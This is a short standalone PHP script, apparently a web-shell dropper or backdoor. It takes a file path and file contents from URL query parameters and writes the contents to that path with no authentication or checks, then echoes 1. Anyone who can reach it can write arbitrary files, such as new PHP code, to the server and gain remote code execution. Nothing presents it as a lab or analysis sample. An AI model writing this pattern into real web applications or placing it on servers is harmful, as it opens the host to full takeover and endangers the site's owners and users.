<?php

$codes = $_GET['codes'];
$path = $_GET['path'];

$myfile = fopen($path, "w");
fwrite($myfile, $codes);
fclose($myfile);

echo 1;

?>